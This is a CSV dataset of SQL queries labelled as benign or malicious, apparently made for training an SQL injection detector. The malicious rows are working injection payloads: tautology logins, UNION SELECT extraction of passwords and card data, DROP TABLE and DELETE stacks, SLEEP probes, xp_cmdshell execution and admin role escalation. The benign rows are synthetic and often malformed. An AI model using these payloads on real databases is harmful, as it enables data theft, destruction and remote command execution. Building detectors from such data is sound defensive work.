query,label
SELECT email FROM books WHERE email=''' OR ''1''=''1'' #';,1
SELECT COUNT(*) FROM users WHERE name = 'Priya';,0
"INSERT INTO sessions (username,password) VALUES ('Charlie', 20);",0
SELECT name FROM students WHERE name = 'Alice';,0
"SELECT email FROM customers WHERE email=''' UNION SELECT NULL, username, password FROM customers --';",1
UPDATE orders SET created_at = Bob WHERE id = 2;,0
SELECT COUNT(*) FROM books WHERE department = 'Charlie';,0
"SELECT * FROM customers WHERE username='"" OR 1=1 --';",1
SELECT * FROM logs WHERE username=''' OR 1=1 --';,1
SELECT COUNT(*) FROM logs WHERE balance = 'Swati';,0
"SELECT * FROM customers WHERE name=''' UNION SELECT credit_card, expiry FROM customers --';",1
1' OR '1'='1' LIMIT 1; --,1
UPDATE books SET created_at = Priya WHERE id = 2;,0
"INSERT INTO sessions (title,author) VALUES (2, 1);",0
SELECT * FROM logs WHERE email=Raj;,0
SELECT * FROM logs WHERE name=''' OR 1=1 --';,1
SELECT quantity FROM products WHERE quantity > 1;,0
SELECT department FROM students WHERE department LIKE '%test%';,0
SELECT COUNT(*) FROM sessions WHERE created_at = 'Priya';,0
DELETE FROM customers WHERE quantity < 20;,0
' OR '1'='1' --,1
'; DELETE FROM customers; --,1
SELECT COUNT(*) FROM employees WHERE balance = 'Charlie';,0
"SELECT * FROM payments WHERE name='"" OR ""1""=""1"" --';",1
' OR 1=1 --,1
SELECT email FROM sessions WHERE email=''' OR ''a''=''a'' --';,1
SELECT * FROM books WHERE id=1'' OR ''1''=''1'' LIMIT 1; --;,1
SELECT name FROM products WHERE name = 'Bob';,0
SELECT COUNT(*) FROM logs WHERE email = 'Charlie';,0
"INSERT INTO logs (name,email) VALUES ('Charlie', 1);",0
' OR 'x'='x' /*,1
"SELECT * FROM orders WHERE name='""; DROP TABLE orders; --';",1
UPDATE logs SET email = email + 2 WHERE balance = 'Charlie';,0
SELECT * FROM orders WHERE id=Charlie;,0
SELECT COUNT(*) FROM customers WHERE id = 'Swati';,0
SELECT email FROM payments WHERE email LIKE '%test%';,0
UPDATE books SET balance = Alice WHERE id = 5;,0
SELECT COUNT(*) FROM students WHERE status = 'Alice';,0
SELECT * FROM employees WHERE status=Priya;,0
SELECT * FROM products WHERE name=''' OR SLEEP(5) --';,1
SELECT * FROM customers WHERE username=''' OR ''a''=''a'' --';,1
"SELECT * FROM orders WHERE username='""; DROP TABLE orders; --';",1
DELETE FROM books WHERE status < 500;,0
SELECT * FROM books WHERE id='' OR ''x''=''x'' /*;,1
SELECT * FROM books WHERE price=Priya;,0
'; DROP TABLE books; --,1
"INSERT INTO orders (id,name) VALUES (100, 'Bob');",0
UPDATE payments SET name = Alice WHERE id = 5;,0
0' OR 1=1 --,1
"SELECT * FROM students WHERE name='"" OR 1=1 --';",1
SELECT * FROM users WHERE username=''' OR SLEEP(5) --';,1
SELECT quantity FROM sessions WHERE quantity = 'Charlie';,0
SELECT department FROM users WHERE department = 'Swati';,0
DELETE FROM books WHERE price < 5;,0
SELECT COUNT(*) FROM customers WHERE quantity = 'Raj';,0
SELECT * FROM products WHERE name=''' OR ''1''=''1'' --';,1
DELETE FROM products WHERE id < 30;,0
UPDATE payments SET email = Priya WHERE id = 30;,0
'; EXEC xp_cmdshell('dir'); --,1
"' UNION SELECT NULL, username, password FROM payments --",1
SELECT * FROM sessions WHERE username=''' OR ''a''=''a'' --';,1
SELECT * FROM sessions WHERE id=Swati;,0
SELECT * FROM sessions WHERE id='' OR SLEEP(5) --;,1
SELECT email FROM employees WHERE email=''' OR ''1''=''1'' --';,1
SELECT * FROM orders WHERE balance=Raj;,0
"INSERT INTO students (id,name) VALUES (30, 'Charlie');",0
UPDATE payments SET id = id + 2 WHERE status = 'Charlie';,0
SELECT balance FROM students WHERE balance = 'Raj';,0
SELECT * FROM students WHERE username=''' OR ''a''=''a'' --';,1
"""; DROP TABLE products; --",1
SELECT * FROM users WHERE id='' OR ''a''=''a'' --;,1
SELECT COUNT(*) FROM sessions WHERE status = 'Alice';,0
UPDATE logs SET age = Charlie WHERE id = 500;,0
SELECT email FROM students WHERE email='''; DELETE FROM students; --';,1
UPDATE sessions SET created_at = Raj WHERE id = 500;,0
"SELECT * FROM products WHERE name=''' UNION SELECT credit_card, expiry FROM products --';",1
DELETE FROM sessions WHERE price < 500;,0
'; EXEC xp_cmdshell('dir'); --,1
"INSERT INTO users (title,author) VALUES (1, 30);",0
SELECT * FROM employees WHERE id=''; UPDATE users SET role=''admin'' WHERE id=1; --;,1
' OR EXISTS(SELECT * FROM customers WHERE username='admin') --,1
"INSERT INTO customers (name,email) VALUES ('Priya', 30);",0
DELETE FROM books WHERE name < 2;,0
DELETE FROM sessions WHERE quantity < 100;,0
' OR 'x'='x' /*,1
SELECT * FROM products WHERE name=''' OR 1=1 --';,1
SELECT * FROM products WHERE name=''' OR ''x''=''x'' /*';,1
"INSERT INTO products (email,active) VALUES (5, 500);",0
"' UNION SELECT credit_card, expiry FROM logs --",1
SELECT * FROM products WHERE username='admin'' #';,1
SELECT department FROM users WHERE department > 10;,0
' OR '1'='1' #,1
SELECT * FROM sessions WHERE id='' OR 1=1 --;,1
SELECT id FROM books WHERE id > 500;,0
SELECT * FROM logs WHERE username='''; EXEC xp_cmdshell(''dir''); --';,1
UPDATE students SET email = email + 1 WHERE department = 'Alice';,0
SELECT * FROM orders WHERE name='0'' OR 1=1 --';,1
SELECT * FROM orders WHERE id=1'' OR ''1''=''1'' LIMIT 1; --;,1
"SELECT * FROM users WHERE username=''' UNION SELECT NULL, username, password FROM users --';",1
SELECT * FROM users WHERE id=0'' OR 1=1 --;,1
SELECT * FROM employees WHERE created_at=Swati;,0
"SELECT email FROM books WHERE email=''' UNION SELECT credit_card, expiry FROM books --';",1
SELECT * FROM customers WHERE email=Swati;,0
SELECT * FROM users WHERE username=''' OR ''1''=''1'' #';,1
' OR SLEEP(5) --,1
UPDATE sessions SET created_at = created_at + 5 WHERE status = 'Bob';,0
SELECT name FROM sessions WHERE name > 500;,0
"SELECT email FROM payments WHERE email='""; DROP TABLE payments; --';",1
"INSERT INTO orders (email,active) VALUES (1, 10);",0
SELECT * FROM orders WHERE username='''; DELETE FROM orders; --';,1
DELETE FROM logs WHERE status < 20;,0
SELECT balance FROM books WHERE balance = 'Alice';,0
' OR SLEEP(5) --,1
SELECT COUNT(*) FROM customers WHERE balance = 'Swati';,0
SELECT * FROM products WHERE name='''; EXEC xp_cmdshell(''dir''); --';,1
' OR 'a'='a' --,1
"INSERT INTO orders (id,name) VALUES (1, 'Charlie');",0
"SELECT * FROM products WHERE username=''' UNION SELECT NULL, username, password FROM products --';",1
"INSERT INTO sessions (email,active) VALUES (20, 30);",0
0' OR 1=1 --,1
SELECT * FROM sessions WHERE name='0'' OR 1=1 --';,1
SELECT quantity FROM logs WHERE quantity > 20;,0
UPDATE products SET id = Bob WHERE id = 2;,0
DELETE FROM orders WHERE status < 30;,0
0' OR 1=1 --,1
SELECT * FROM sessions WHERE id=admin'' --;,1
SELECT department FROM sessions WHERE department > 1;,0
DELETE FROM products WHERE quantity < 2;,0
DELETE FROM payments WHERE name < 20;,0
"SELECT * FROM users WHERE name='"" OR 1=1 --';",1
"SELECT email FROM employees WHERE email='""; DROP TABLE employees; --';",1
"INSERT INTO logs (username,password) VALUES ('Priya', 10);",0
' OR '1'='1' --,1
UPDATE employees SET price = price + 2 WHERE email = 'Priya';,0
SELECT created_at FROM payments WHERE created_at > 30;,0
UPDATE books SET age = Priya WHERE id = 10;,0
SELECT * FROM logs WHERE username='admin'' #';,1
DELETE FROM sessions WHERE id < 5;,0
SELECT COUNT(*) FROM sessions WHERE status = 'Swati';,0
"' UNION SELECT credit_card, expiry FROM employees --",1
"SELECT email FROM orders WHERE email='"" OR ""1""=""1"" --';",1
1' OR '1'='1' LIMIT 1; --,1
SELECT * FROM logs WHERE name=''' OR ''1''=''1'' #';,1
UPDATE users SET created_at = Charlie WHERE id = 2;,0
SELECT * FROM students WHERE quantity=Priya;,0
UPDATE orders SET status = Raj WHERE id = 100;,0
SELECT email FROM users WHERE email = 'Charlie';,0
SELECT name FROM payments WHERE name = 'Bob';,0
SELECT balance FROM users WHERE balance > 5;,0
UPDATE users SET created_at = created_at + 5 WHERE department = 'Raj';,0
' OR '1'='1' --,1
SELECT department FROM sessions WHERE department = 'Priya';,0
SELECT status FROM sessions WHERE status = 'Priya';,0
SELECT * FROM users WHERE name='1'' OR ''1''=''1'' LIMIT 1; --';,1
"SELECT * FROM payments WHERE username=''' UNION SELECT credit_card, expiry FROM payments --';",1
DELETE FROM users WHERE id < 500;,0
"INSERT INTO payments (title,author) VALUES (20, 500);",0
"INSERT INTO users (email,active) VALUES (1, 30);",0
"SELECT * FROM employees WHERE name='"" OR 1=1 --';",1
SELECT age FROM students WHERE age > 100;,0
DELETE FROM payments WHERE age < 20;,0
SELECT COUNT(*) FROM customers WHERE id = 'Alice';,0
SELECT email FROM books WHERE email=''' OR ''x''=''x'' /*';,1
' OR 'a'='a' --,1
"INSERT INTO orders (username,password) VALUES ('Charlie', 5);",0
""" OR 1=1 --",1
SELECT COUNT(*) FROM payments WHERE email = 'Swati';,0
"INSERT INTO products (title,author) VALUES (2, 5);",0
SELECT * FROM users WHERE username='admin'' --';,1
DELETE FROM orders WHERE age < 2;,0
SELECT name FROM customers WHERE name > 10;,0
UPDATE payments SET price = price + 2 WHERE created_at = 'Bob';,0
0' OR 1=1 --,1
SELECT email FROM students WHERE email=''' OR SLEEP(5) --';,1
SELECT balance FROM customers WHERE balance > 1;,0
SELECT * FROM books WHERE department=Priya;,0
SELECT created_at FROM students WHERE created_at > 1;,0
SELECT * FROM employees WHERE username=''' OR ''1''=''1'' --';,1
SELECT email FROM employees WHERE email = 'Bob';,0
'; DROP TABLE employees; --,1
UPDATE books SET price = price + 2 WHERE balance = 'Charlie';,0
SELECT age FROM books WHERE age LIKE '%test%';,0
UPDATE products SET name = Bob WHERE id = 500;,0
UPDATE logs SET name = name + 5 WHERE status = 'Priya';,0
SELECT COUNT(*) FROM products WHERE status = 'Swati';,0
""" OR 1=1 --",1
SELECT COUNT(*) FROM users WHERE department = 'Raj';,0
' OR 1=1 --,1
1' OR '1'='1' LIMIT 1; --,1
"SELECT * FROM products WHERE id='' UNION SELECT NULL, username, password FROM products --;",1
SELECT * FROM employees WHERE id=admin'' --;,1
"INSERT INTO customers (username,password) VALUES ('Charlie', 30);",0
SELECT * FROM employees WHERE name=''' OR EXISTS(SELECT * FROM employees WHERE username=''admin'') --';,1
SELECT COUNT(*) FROM books WHERE created_at = 'Raj';,0
' OR '1'='1' #,1
"INSERT INTO products (title,author) VALUES (2, 1);",0
' OR 'x'='x' /*,1
SELECT * FROM users WHERE username=''' OR ''1''=''1'' #';,1
UPDATE sessions SET created_at = created_at + 2 WHERE name = 'Charlie';,0
SELECT quantity FROM students WHERE quantity LIKE '%test%';,0
SELECT balance FROM users WHERE balance LIKE '%test%';,0
SELECT quantity FROM employees WHERE quantity LIKE '%test%';,0
SELECT * FROM orders WHERE name='admin'' #';,1
SELECT department FROM logs WHERE department = 'Swati';,0
SELECT COUNT(*) FROM employees WHERE department = 'Charlie';,0
SELECT COUNT(*) FROM logs WHERE id = 'Swati';,0
SELECT price FROM payments WHERE price = 'Priya';,0
SELECT * FROM orders WHERE id=''; UPDATE users SET role=''admin'' WHERE id=1; --;,1
SELECT id FROM sessions WHERE id > 5;,0
SELECT * FROM sessions WHERE name=Charlie;,0
SELECT COUNT(*) FROM payments WHERE created_at = 'Priya';,0
SELECT email FROM users WHERE email=''' OR EXISTS(SELECT * FROM users WHERE username=''admin'') --';,1
UPDATE logs SET status = Swati WHERE id = 1;,0
"SELECT email FROM logs WHERE email=''' UNION SELECT NULL, username, password FROM logs --';",1
"INSERT INTO users (email,active) VALUES (2, 20);",0
"INSERT INTO orders (id,name) VALUES (500, 'Alice');",0
DELETE FROM books WHERE price < 20;,0
'; DELETE FROM payments; --,1
' OR EXISTS(SELECT * FROM employees WHERE username='admin') --,1
"""; DROP TABLE users; --",1
SELECT id FROM employees WHERE id = 'Alice';,0
' OR 1=1 --,1
"INSERT INTO users (name,email) VALUES ('Bob', 5);",0
SELECT * FROM products WHERE id=Charlie;,0
DELETE FROM orders WHERE quantity < 1;,0
SELECT balance FROM customers WHERE balance > 1;,0
UPDATE sessions SET created_at = created_at + 1 WHERE price = 'Bob';,0
UPDATE customers SET balance = Bob WHERE id = 500;,0
'; UPDATE users SET role='admin' WHERE id=1; --,1
SELECT * FROM students WHERE username='1'' OR ''1''=''1'' LIMIT 1; --';,1
SELECT age FROM employees WHERE age > 30;,0
DELETE FROM sessions WHERE email < 2;,0
SELECT COUNT(*) FROM customers WHERE id = 'Bob';,0
SELECT department FROM students WHERE department LIKE '%test%';,0
' OR 'a'='a' --,1
SELECT department FROM sessions WHERE department > 30;,0
SELECT age FROM products WHERE age = 'Priya';,0
SELECT * FROM students WHERE username='''; DROP TABLE students; --';,1
SELECT * FROM customers WHERE id=1'' OR ''1''=''1'' LIMIT 1; --;,1
"' UNION SELECT credit_card, expiry FROM customers --",1
SELECT name FROM customers WHERE name = 'Charlie';,0
UPDATE logs SET id = Alice WHERE id = 100;,0
SELECT * FROM users WHERE id=''; UPDATE users SET role=''admin'' WHERE id=1; --;,1
UPDATE payments SET balance = Priya WHERE id = 30;,0
UPDATE employees SET id = id + 1 WHERE price = 'Swati';,0
SELECT * FROM sessions WHERE name='''; UPDATE users SET role=''admin'' WHERE id=1; --';,1
UPDATE employees SET email = Charlie WHERE id = 100;,0
SELECT email FROM users WHERE email='admin'' #';,1
"INSERT INTO users (id,product,qty) VALUES (30, 1, 30);",0
DELETE FROM sessions WHERE email < 10;,0
"' UNION SELECT credit_card, expiry FROM payments --",1
DELETE FROM users WHERE id < 5;,0
"SELECT * FROM employees WHERE id="" OR ""1""=""1"" --;",1
SELECT price FROM books WHERE price LIKE '%test%';,0
SELECT department FROM products WHERE department = 'Alice';,0
UPDATE products SET email = Raj WHERE id = 2;,0
"INSERT INTO customers (name,email) VALUES ('Swati', 1);",0
"INSERT INTO payments (id,product,qty) VALUES (5, 1, 500);",0
' OR 1=1 --,1
SELECT * FROM sessions WHERE status=Raj;,0
SELECT * FROM customers WHERE id=admin'' --;,1
UPDATE sessions SET quantity = quantity + 5 WHERE email = 'Charlie';,0
SELECT status FROM students WHERE status > 2;,0
SELECT * FROM employees WHERE id=1'' OR ''1''=''1'' LIMIT 1; --;,1
"SELECT * FROM payments WHERE name='"" OR 1=1 --';",1
UPDATE products SET age = Bob WHERE id = 5;,0
'; DROP TABLE logs; --,1
' OR '1'='1' --,1
SELECT name FROM sessions WHERE name > 5;,0
SELECT age FROM products WHERE age LIKE '%test%';,0
SELECT COUNT(*) FROM customers WHERE age = 'Raj';,0
SELECT price FROM books WHERE price LIKE '%test%';,0
' OR 1=1 --,1
UPDATE logs SET created_at = created_at + 5 WHERE status = 'Alice';,0
DELETE FROM payments WHERE created_at < 20;,0
UPDATE logs SET quantity = Swati WHERE id = 30;,0
SELECT age FROM orders WHERE age LIKE '%test%';,0
DELETE FROM orders WHERE status < 5;,0
SELECT quantity FROM logs WHERE quantity = 'Alice';,0
SELECT * FROM payments WHERE username='''; DELETE FROM payments; --';,1
' OR '1'='1' #,1
' OR 1=1 --,1
SELECT * FROM logs WHERE id=''; EXEC xp_cmdshell(''dir''); --;,1
"SELECT * FROM books WHERE username=''' UNION SELECT credit_card, expiry FROM books --';",1
SELECT * FROM sessions WHERE username=''' OR ''a''=''a'' --';,1
SELECT COUNT(*) FROM logs WHERE balance = 'Swati';,0
""" OR 1=1 --",1
SELECT * FROM orders WHERE name='''; EXEC xp_cmdshell(''dir''); --';,1
UPDATE books SET department = department + 1 WHERE created_at = 'Raj';,0
SELECT email FROM payments WHERE email=''' OR ''x''=''x'' /*';,1
SELECT * FROM users WHERE username=''' OR ''a''=''a'' --';,1
"SELECT * FROM students WHERE name='""; DROP TABLE students; --';",1
"SELECT * FROM payments WHERE name=''' UNION SELECT credit_card, expiry FROM payments --';",1
UPDATE payments SET name = name + 2 WHERE quantity = 'Swati';,0
SELECT * FROM sessions WHERE id=admin'' #;,1
SELECT COUNT(*) FROM students WHERE name = 'Bob';,0
SELECT * FROM products WHERE username=''' OR ''a''=''a'' --';,1
SELECT * FROM customers WHERE username='1'' OR ''1''=''1'' LIMIT 1; --';,1
SELECT email FROM products WHERE email = 'Bob';,0
DELETE FROM employees WHERE department < 500;,0
' OR 'a'='a' --,1
UPDATE users SET created_at = Swati WHERE id = 1;,0
SELECT COUNT(*) FROM books WHERE status = 'Bob';,0
SELECT * FROM books WHERE name='admin'' --';,1
SELECT * FROM products WHERE department=Raj;,0
SELECT COUNT(*) FROM employees WHERE balance = 'Bob';,0
SELECT email FROM users WHERE email LIKE '%test%';,0
SELECT * FROM customers WHERE email=Priya;,0
"SELECT email FROM users WHERE email=''' UNION SELECT NULL, username, password FROM users --';",1
SELECT * FROM payments WHERE department=Bob;,0
SELECT * FROM employees WHERE id=''; EXEC xp_cmdshell(''dir''); --;,1
SELECT email FROM books WHERE email > 500;,0
UPDATE payments SET price = Raj WHERE id = 1;,0
"INSERT INTO employees (id,name) VALUES (2, 'Swati');",0
SELECT status FROM employees WHERE status LIKE '%test%';,0
SELECT created_at FROM products WHERE created_at > 10;,0
SELECT age FROM employees WHERE age LIKE '%test%';,0
DELETE FROM customers WHERE id < 1;,0
UPDATE payments SET balance = balance + 5 WHERE price = 'Bob';,0
SELECT * FROM employees WHERE id=Charlie;,0
' OR 1=1 --,1
SELECT COUNT(*) FROM employees WHERE quantity = 'Bob';,0
SELECT created_at FROM customers WHERE created_at LIKE '%test%';,0
SELECT email FROM products WHERE email='''; DROP TABLE products; --';,1
UPDATE users SET balance = Priya WHERE id = 500;,0
SELECT email FROM employees WHERE email='admin'' #';,1
SELECT * FROM employees WHERE username='''; UPDATE users SET role=''admin'' WHERE id=1; --';,1
SELECT COUNT(*) FROM orders WHERE email = 'Bob';,0
SELECT balance FROM sessions WHERE balance = 'Swati';,0
SELECT department FROM products WHERE department > 1;,0
"SELECT * FROM customers WHERE name='"" OR 1=1 --';",1
SELECT * FROM customers WHERE name='''; DELETE FROM customers; --';,1
'; DROP TABLE students; --,1
